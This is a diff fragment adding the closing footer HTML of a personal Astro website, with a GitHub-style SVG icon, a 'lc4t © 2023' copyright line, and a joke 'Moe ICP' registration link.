+    <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"></path>
+  </svg>
+      
+</a>
+</div>
+    <div class="astro-SZ7XMLTE copyright-wrapper">
+      <span class="astro-SZ7XMLTE">lc4t © 2023</span>
+      <span class="astro-SZ7XMLTE separator">&nbsp;|&nbsp;</span>
+      <span class="astro-SZ7XMLTE">The Things Less Created.</span>
+    </div>
+    <a href="https://icp.gov.moe/?keyword=20237773" class="inline-block astro-5EUNQZKT group undefined" tabindex="0">
+  
+      萌ICP备20237773号
+    
+</a>
+  </div>
+</footer>
+
+  </body></html>
